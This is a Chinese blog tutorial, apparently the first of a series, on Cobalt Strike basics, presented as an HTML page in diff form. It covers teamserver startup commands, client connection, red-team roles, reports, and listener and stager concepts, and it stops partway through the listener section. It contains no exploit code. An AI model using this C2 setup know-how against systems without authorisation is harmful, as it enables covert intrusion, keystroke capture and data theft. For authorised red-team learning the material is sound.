@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Cobalt Strike Basic No.1 - V4ler1an</title><meta name="Description" content="CS基础知识记录"><meta property="og:title" content="Cobalt Strike Basic No.1" />
+<meta property="og:description" content="CS基础知识记录" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" /><meta property="og:image" content="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/cs.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-01-11T05:57:40+08:00" />
+<meta property="article:modified_time" content="2024-01-11T06:59:40+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/cs.png" /><meta name="twitter:title" content="Cobalt Strike Basic No.1"/>
+<meta name="twitter:description" content="CS基础知识记录"/>
+<meta name="twitter:site" content="@YaoyaoShaw"/>
+<meta name="application-name" content="V4ler1an">
+<meta name="apple-mobile-web-app-title" content="V4ler1an"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.1/" /><link rel="prev" href="https://www.v4ler1an.com/2023/11/vulnhub_walkthrough-matrix-breakout-2-morpheus/" /><link rel="next" href="https://www.v4ler1an.com/2024/01/cobalt_strike_basic_no.2/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Cobalt Strike Basic No.1",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.v4ler1an.com\/2024\/01\/cobalt_strike_basic_no.1\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/www.v4ler1an.com\/2024\/01\/cobalt_strike_basic_no.1\/cs.png",
+                            "width":  425 ,
+                            "height":  119 
+                        }],"genre": "posts","keywords": "C2","wordcount":  5698 ,
+        "url": "https:\/\/www.v4ler1an.com\/2024\/01\/cobalt_strike_basic_no.1\/","datePublished": "2024-01-11T05:57:40+08:00","dateModified": "2024-01-11T06:59:40+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "https:\/\/www.v4ler1an.com\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "v4ler1an"
+            },"description": "CS基础知识记录"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/about/"> 我 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/2024/01/cobalt_strike_basic_no.1/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="V4ler1an"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/personal_logo.png"
+        data-srcset="/images/personal_logo.png, /images/personal_logo.png 1.5x, /images/personal_logo.png 2x"
+        data-sizes="auto"
+        alt="/images/personal_logo.png"
+        title="/images/personal_logo.png" />V4ler1an</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/about/" title="">我</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/2024/01/cobalt_strike_basic_no.1/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Cobalt Strike Basic No.1</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://www.v4ler1an.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>v4ler1an</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/pentesting/"><i class="far fa-folder fa-fw"></i>Pentesting</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2024-01-11">2024-01-11</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 5698 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 12 分钟&nbsp;<span id="/2024/01/cobalt_strike_basic_no.1/" class="leancloud_visitors" data-flag-title="Cobalt Strike Basic No.1">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/2024/01/cobalt_strike_basic_no.1/cs.png"
+        data-srcset="/2024/01/cobalt_strike_basic_no.1/cs.png, /2024/01/cobalt_strike_basic_no.1/cs.png 1.5x, /2024/01/cobalt_strike_basic_no.1/cs.png 2x"
+        data-sizes="auto"
+        alt="/2024/01/cobalt_strike_basic_no.1/cs.png"
+        title="CS基础知识记录" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#一基础操作">一、基础操作</a>
+      <ul>
+        <li><a href="#简介">简介</a></li>
+        <li><a href="#组织结构">组织结构</a></li>
+        <li><a href="#连接方式">连接方式</a>
+          <ul>
+            <li><a href="#开启server">开启server</a></li>
+            <li><a href="#client连接server">client连接server</a></li>
+            <li><a href="#client连接不同的server">client连接不同的server</a></li>
+          </ul>
+        </li>
+        <li><a href="#分布式协作">分布式协作</a>
+          <ul>
+            <li><a href="#可伸缩红队操作模型">可伸缩红队操作模型</a></li>
+            <li><a href="#团队角色">团队角色</a></li>
+          </ul>
+        </li>
+        <li><a href="#日志与报告">日志与报告</a>
+          <ul>
+            <li><a href="#日志记录">日志记录</a></li>
+            <li><a href="#导出报告">导出报告</a></li>
+            <li><a href="#报告类型">报告类型</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#二基础设施">二、基础设施</a>
+      <ul>
+        <li><a href="#listener管理">Listener管理</a>
+          <ul>
+            <li><a href="#stager">Stager</a></li>
+            <li><a href="#创建listener">创建Listener</a></li>
+          </ul>
+        </li>
+        <li><a href="#http和https-beacon">HTTP和HTTPS Beacon</a></li>
+        <li><a href="#dns-beacon">DNS Beacon</a></li>
+        <li><a href="#smb-beacon">SMB Beacon</a></li>
+        <li><a href="#tcp-beacon">TCP Beacon</a></li>
+        <li><a href="#foreign-beacon">Foreign Beacon</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>体系化总结一下Cobalt Strike的基本知识和使用，主要面向新手，希望可以快速上手该工具，建立系统化知识结构。</p>
+<h2 id="一基础操作">一、基础操作</h2>
+<h3 id="简介">简介</h3>
+<p>Cobalt Strike是一款渗透测试神器，简称CS，早期依赖Metasploit框架，现在已作为单独的平台使用。</p>
+<p>Cobalt Strike集成了端口转发、扫描、监听Listener、Windows exe程序payload生成、Windows DLL动态链接库payload生成、java程序payload生成、office宏代码payload生成，还包括站点克隆、获取浏览器的相关信息等功能。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221439991.png"
+        title="image-20240222143954956" /></p>
+<h3 id="组织结构">组织结构</h3>
+<p>Cobalt Strike采用的是C/S架构，server端连接到目标服务器，client再连接server。所以，client不会直接与目标服务器进行交互。设计的主要目的是为了分布式团队协作。</p>
+<p>文件目录结构如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/CobaltSrike_4.9.1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ tree -L <span class="m">2</span> .
+</span></span><span class="line"><span class="cl">.
+</span></span><span class="line"><span class="cl">├── Client
+</span></span><span class="line"><span class="cl">│   ├── cobaltstrike.auth
+</span></span><span class="line"><span class="cl">│   ├── cobaltstrike-client.cmd		-- Windows client启动文件
+</span></span><span class="line"><span class="cl">│   ├── cobaltstrike-client.jar		-- client启动jar文件
+</span></span><span class="line"><span class="cl">│   ├── cobaltstrike-client.sh		-- Linux/MacOS client启动文件
+</span></span><span class="line"><span class="cl">│   └── uHook.jar							
+</span></span><span class="line"><span class="cl">└── Server
+</span></span><span class="line"><span class="cl">    ├── c2lint				-- 检查profile的错误和异常
+</span></span><span class="line"><span class="cl">    ├── cobaltstrike.auth
+</span></span><span class="line"><span class="cl">    ├── cobaltstrike.store              -- server和client加密通信的证书
+</span></span><span class="line"><span class="cl">    ├── data
+</span></span><span class="line"><span class="cl">    ├── downloads                       -- 文件下载目录
+</span></span><span class="line"><span class="cl">    ├── logs                            -- 日志目录
+</span></span><span class="line"><span class="cl">    ├── screenshots                     -- 截图目录
+</span></span><span class="line"><span class="cl">    ├── source-common.sh
+</span></span><span class="line"><span class="cl">    ├── teamserver			-- server启动脚本
+</span></span><span class="line"><span class="cl">    ├── TeamServerImage			-- 实际的启动elf文件
+</span></span><span class="line"><span class="cl">    └── third-party		        -- 第三方工具
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="连接方式">连接方式</h3>
+<p>Cobalt Strike的client想要连接server需要知道三个信息：</p>
+<ul>
+<li>server的外部ip地址</li>
+<li>serve的连接密码</li>
+<li>(optional)决定malleable C2工具的哪一个配置文件用于server</li>
+</ul>
+<h4 id="开启server">开启server</h4>
+<p>开启server的常规命令如下（Linux环境）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">./teamserver your_ip your_password <span class="o">[</span>config_file<span class="o">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/CobaltSrike_4.9.1/Server<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo ./teamserver 172.16.86.138 v4ler1an
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> v4ler1an:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Will use existing X509 certificate and keystore <span class="o">(</span><span class="k">for</span> SSL<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Starting teamserver
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Team Server Version: 4.9.1 <span class="o">(</span>Pwn3rs<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Setting <span class="s1">&#39;https.protocols&#39;</span> system property: SSLv3,SSLv2Hello,TLSv1,TLSv1.1,TLSv1.2,TLSv1.3
+</span></span><span class="line"><span class="cl">... ...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Team server is up on 0.0.0.0:50050
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> SHA256 <span class="nb">hash</span> of SSL cert is: xxxx
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listener: <span class="nb">test</span> started!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="client连接server">client连接server</h4>
+<p>client可以在Windows、Linux、MaxOS下运行，根据个人需求来就行。4.9版本的client的目录下的启动文件如下:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>v4ler1an㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/tools/CobaltSrike_4.9.1/Client<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ls
+</span></span><span class="line"><span class="cl">cobaltstrike.auth  cobaltstrike-client.cmd  cobaltstrike-client.jar  cobaltstrike-client.sh  uHook.jar
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接运行对应的文件即可。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221427358.png"
+        title="image-20240222142725955" /></p>
+<p>点击Connect后，第一次连接会有提示信息，要求确认提示信息中的hash是不是server的hash，确认是就点击Yes，就可以进入client的GUI界面：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221429093.png"
+        title="image-20240222142904061" /></p>
+<p>成功连接后，团队成员直接可以直接在client中进行交流沟通，信息共享等。</p>
+<h4 id="client连接不同的server">client连接不同的server</h4>
+<p>Cobalt Strike的设计初衷是在不同的阶段使用不同的server，因此在一次渗透行动中往往会使用到多个server。这样设计的目的主要是进行任务隔离，确保安全，在一个server出现意外停止运行时，不会影响到整个渗透过程。</p>
+<p>连接不同的server，在client的左上角的+号，输入server信息即可连接：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454506.png"
+        title="image-20240222145413463" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221454315.png"
+        title="image-20240222145445280" /></p>
+<p>此时在最下方就会有多个server连接的切换条。</p>
+<h3 id="分布式协作">分布式协作</h3>
+<p>这里以最基本的团队模型为例，涉及三个server：</p>
+<ul>
+<li>Staging Servers，临时服务器，主要为了在短时间内对目标系统进行访问，也是最开始用于传递payload、获取初始权限的server，承担了初始的权限提升和下载权限维持程序的功能，暴露风险较大。</li>
+<li>Long Haul Servers，持久化访问服务器，保持对目标网络的长期访问，以较低频率与目标进行通信。</li>
+<li>Post-Exploitation Servers，后渗透服务器，进行后渗透及横向移动的相关任务，比如与目标进行交互式访问。</li>
+</ul>
+<h4 id="可伸缩红队操作模型">可伸缩红队操作模型</h4>
+<p>Scaling Red Operations，可伸缩红队操作模型，分为两个层次，第一层次是针对单个目标网络的目标单元；第二层次是针对多个目标网络的权限管理单元。</p>
+<p>目标单元的工作：</p>
+<ul>
+<li>负责具体目标或行动的对象</li>
+<li>获得访问权限、后渗透、横向移动</li>
+<li>维护本地基础设施</li>
+</ul>
+<p>访问管理单元的工作：</p>
+<ul>
+<li>保持所有目标网络的访问权限</li>
+<li>获取访问权限并接收来自单元的访问</li>
+<li>根据需要传递对目标单元的访问</li>
+<li>为持续回调保持全局基础环境</li>
+</ul>
+<h4 id="团队角色">团队角色</h4>
+<ul>
+<li>初始渗透人员，主要任务是进入目标系统，并扩大立足点</li>
+<li>后渗透人员，主要任务是对目标系统进行数据挖掘、对用户进行监控、收集目标系统的密钥、日志等敏感信息</li>
+<li>权限管理人员，主要任务是建立基础设施、保持shell的持久化访问、管理回调、传递全局访问管理单元之间的会话</li>
+</ul>
+<h3 id="日志与报告">日志与报告</h3>
+<h4 id="日志记录">日志记录</h4>
+<p>Cobalt Strike的日志文件在团队服务器下的运行目录中的<code>logs</code>文件夹内，其中有些日志文件名例如<code>beacon_11309.log</code>，这里的<code>11309</code>就是beacon会话的ID。</p>
+<p>按键的日志在<code>keystrokes</code>文件夹内，截屏的日志在<code>screenshots</code>文件夹内，截屏的日志名称一般如<code>screen_015321_4826.jpg</code>类似，其中<code>015321</code>表示时间（1点53分21秒），<code>4826</code>表示ID。</p>
+<h4 id="导出报告">导出报告</h4>
+<p>Cobalt Strike生成报告的目的在于培训或帮助蓝队，在<code>Reporting</code>菜单栏中就可以生成报告，关于生成的报告有以下特点：</p>
+<ul>
+<li>输出格式为PDF或者Word格式</li>
+<li>可以输出自定义报告并且更改图标（Cobalt Strike –&gt; Preferences –&gt;Reporting）</li>
+<li>可以合并多个团队服务器的报告，并可以对不同报告里的时间进行校正。</li>
+</ul>
+<h4 id="报告类型">报告类型</h4>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221539311.png"
+        title="image-20240222153927259" /></p>
+<ul>
+<li>
+<p>活动报告（Activity Report）</p>
+<p>提供红队活动的时间表，记录了每个后渗透活动。</p>
+</li>
+<li>
+<p>主机报告（Hosts Report）</p>
+<p>汇总了Cobalt Strike收集的主机信息，凭据、服务和会话也包含在报告内。</p>
+</li>
+<li>
+<p>入侵指标报告（Indicators of Compromise）</p>
+<p>包括对C2扩展文件的分析、使用的域名和上传文件的md5。</p>
+</li>
+<li>
+<p>会话报告（Sessions Report）</p>
+<p>记录了每个会话的指标和活动，包括每个会话回连到自己的通信路径、后渗透活动的时间线等。</p>
+</li>
+<li>
+<p>社工报告（Social Engineering Report）</p>
+<p>记录了每一轮网络钓鱼的电子邮件、谁点击了邮件以及从每个点击用户处收集的信息。该报告还显示了CS的System profiler发现的应用程序。</p>
+</li>
+<li>
+<p>TTP报告（Tactics，Techniques，and Procedures）</p>
+<p>将自己的CS行动与ATT&amp;CK矩阵进行映射，给出具体的ttp。</p>
+</li>
+</ul>
+<h2 id="二基础设施">二、基础设施</h2>
+<h3 id="listener管理">Listener管理</h3>
+<p>定义：等待受害目标回连自己的一个服务。</p>
+<p>作用：主要是为了接受payload回传的各类数据，类似于msf中的handler。例如，payload在目标机器执行后，就会回连到listener然后下载执行真正的shellcode代码。一旦listener建立成功，团队成员只需要知道这个listener的名称即可，不必关心listener背后的基础环境。</p>
+<p>一个listener由用户定义的名称、payload类型和几个特定于payload的选项组成。Listener的名字一般由以下结构组成：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">// 操作系统/攻击载荷/传输器
+</span></span><span class="line"><span class="cl">Operating System/Payload/Stager
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">example:
+</span></span><span class="line"><span class="cl">windows/beacon_http/reverse_http
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="stager">Stager</h4>
+<p>payload是需要执行的具体攻击内容，通常分为两部分：stager和stage。</p>
+<p>stager是一个体积较小的程序，用于连接、下载stage，并插入到内存中。</p>
+<p>为什么会有stager的概念？这是因为在很多攻击中，对于能加载到内存并在成功漏洞利用后执行的数据大小存在严格的限制，这就导致在攻击成功时，很难嵌入额外的payload，因此出现了stager。</p>
+<h4 id="创建listener">创建Listener</h4>
+<p>在CS的client中打开Cobalt Strike -&gt; Listeners，之后点击下方的Add，弹出New Listener窗口：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png"
+        data-srcset="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png 1.5x, https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png 2x"
+        data-sizes="auto"
+        alt="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221738559.png"
+        title="image-20240222173802492" /></p>
+<p>CS的listener目前有三种类型：</p>
+<ul>
+<li>
+<p>Beacon类型：直译是信标的意思，是以一种比较隐蔽的后渗透代理，也是CS默认使用的一种类型。Beacon Listener的名称例子如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">windows/beacon_http/reverse_http
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>Foreign类型：外部listener，主要作用是给其他的payload提供别名，比如msf中的payload。该类型的listener主要是为了提升CS的兼容性，payload可以使用其他的软件生成，但是可以适配CS的listener：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">windows/foregin/reverse_https
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>External C2（新增）：使用其他类型的C2，是新增选项，允许第三方程序使用外部C2服务器与CS的server进行交互。</p>
+</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202402221739566.png"
